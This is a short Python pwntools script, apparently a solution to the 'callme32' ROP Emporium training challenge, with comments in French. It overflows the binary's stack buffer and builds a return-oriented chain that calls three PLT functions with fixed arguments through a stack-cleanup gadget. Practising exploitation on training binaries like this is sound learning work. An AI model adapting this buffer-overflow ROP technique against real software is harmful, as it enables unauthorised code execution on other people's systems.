#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+97
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('callme32')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

callme_one=elf.plt['callme_one']
callme_two=elf.plt['callme_two']
callme_three=elf.plt['callme_three']

# Au choix
# 0x080484aa : add esp, 8 ; pop ebx ; ret
g_pop3ret=0x080484aa
# 0x080487f9 :  pop esi ; pop edi ; pop ebp ; ret
#g_pop3ret=0x080487f9

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p32(callme_one)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

PL+=p32(callme_two)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

PL+=p32(callme_three)
PL+=p32(0xdeadbeef)
PL+=p32(0xcafebabe)
PL+=p32(0xd00df00d)

# affichage du prinf correspondant pour mise au point
print("")
print(f"printf %{offset}s"+''.join([ f"\\x{c:02x}" for c in PL[offset:]])+" A")
print("")

io.sendline(PL)
io.interactive()

